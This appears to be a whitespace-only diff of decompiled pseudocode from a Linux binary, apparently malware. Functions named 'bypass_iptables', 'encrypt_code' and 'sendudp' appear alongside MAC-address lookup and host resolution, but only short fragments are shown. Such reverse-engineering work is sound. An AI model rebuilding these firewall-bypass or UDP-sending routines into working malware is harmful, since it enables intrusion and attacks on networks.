@@ -15,7 +15,7 @@ undefined8 main(undefined8 argc, char **argv)
  undefined8 var_24h;
  int32_t var_18h;
  int64_t var_14h;
- 
+
  var_24h._0_4_ = (int32_t)argc;
  if ((int32_t)argc < 2) {
   var_14h._0_4_ = 0;
@@ -74,21 +74,21 @@ if (fildes != 0xffffffff) {
   while ((int32_t)s1 < var_3ch) {
  iVar1 = strncmp(&var_560h + (int64_t)(int32_t)s1 * 5, 0x408380, 2);
  if (((iVar1 != 0) &&
-  (iVar1 = ioctl(fildes, 0x8927, &var_560h + (int64_t)(int32_t)s1 * 5, &var_560h), -1 < iVar1)) && 
+  (iVar1 = ioctl(fildes, 0x8927, &var_560h + (int64_t)(int32_t)s1 * 5, &var_560h), -1 < iVar1)) &&
  ((acStack1366[(int64_t)(int32_t)s1 * 0x28] != '\0' ||
  ((((acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1] != '\0' ||
  (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2] != '\0')) ||
  (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3] != '\0')) ||
  ((acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4] != '\0' ||
  (acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5] != '\0')))))))) {
-  sprintf(arg1, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", 
- acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5], 
- acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3], 
+  sprintf(arg1, "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
+ acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 1],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5],
+ acStack1366[(int64_t)(int32_t)s1 * 0x28 + 2], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 3],
  acStack1366[(int64_t)(int32_t)s1 * 0x28 + 4], acStack1366[(int64_t)(int32_t)s1 * 0x28 + 5]);
   close(fildes);  // close access to socket
   return 0;
@@ -120,7 +120,7 @@ if (fildes != 0xffffffff) {
 var_10h = (char *)0x4084e1;
 memset(arg1, 0, (int64_t)(int32_t)arg2);
 fildes = socket(2, 2, 0);
-if ((int32_t)fildes < 0) {var_8h._0_4_ = 0;} 
+if ((int32_t)fildes < 0) {var_8h._0_4_ = 0;}
 else {
   var_2b0h._0_4_ = 0x280;
   var_2a8h = (int64_t)&var_2a0h;
@@ -152,7 +152,7 @@ return (int32_t)var_8h;
 var_4h = 0;
 var_20h = 0;
 var_18h = 0;
-if (CONCAT44(in_RDI, arg1) == 0) {var_4h = 0;} 
+if (CONCAT44(in_RDI, arg1) == 0) {var_4h = 0;}
 else {
   iVar1 = is_ip(arg1);
   if (iVar1 < 1) {
@@ -160,7 +160,7 @@ else {
    if (iVar1 != 0) {var_4h = inet_addr(&var_20h);}
   } else {
    iVar2 = gethostbyname(CONCAT44(in_RDI, arg1));
-   if (iVar2 == 0) {var_4h = 0;} 
+   if (iVar2 == 0) {var_4h = 0;}
    else {
  var_4h = ***(uint32_t ***)(iVar2 + 0x18);
  if (var_4h == 0) {var_4h = 0;}
@@ -180,7 +180,7 @@ undefined4 bypass_iptables(int64_t arg1, int64_t arg2)
  int64_t var_18h;
  uint32_t fildes;
  int64_t var_4h;
- 
+
  var_34h._0_4_ = (undefined4)arg1;
  var_34h._4_4_ = (undefined4)arg2;
  var_4h._0_4_ = 0xffffffff;
@@ -205,7 +205,7 @@ void * encrypt_code(void *arg1, undefined8 arg2, undefined8 arg3)
  void *var_18h;
  int64_t var_10h;
  int64_t var_8h;
- 
+
  var_10h._4_4_ = 0;
  var_8h = (int64_t)arg1;
  while (var_10h._4_4_ < (int32_t)arg2) {
@@ -394,7 +394,7 @@ int64_t var_34h;
 int64_t var_20h;
 int64_t var_18h;
 uint32_t fildes;
-int64_t var_4h;   
+int64_t var_4h;
 var_34h._0_4_ = (undefined4)arg1;
 var_34h._4_4_ = (undefined4)arg2;
 var_4h._0_4_ = 0xffffffff;
@@ -498,7 +498,7 @@ undefined4 sendudp(int64_t arg1, int64_t arg2, void *arg3, int64_t arg4)
  undefined4 optname;
  uint32_t fildes;
  int64_t var_4h;
- 
+
  var_24h._0_4_ = (undefined4)arg1;
  fildes = 0xffffffff;
  optname = 1;
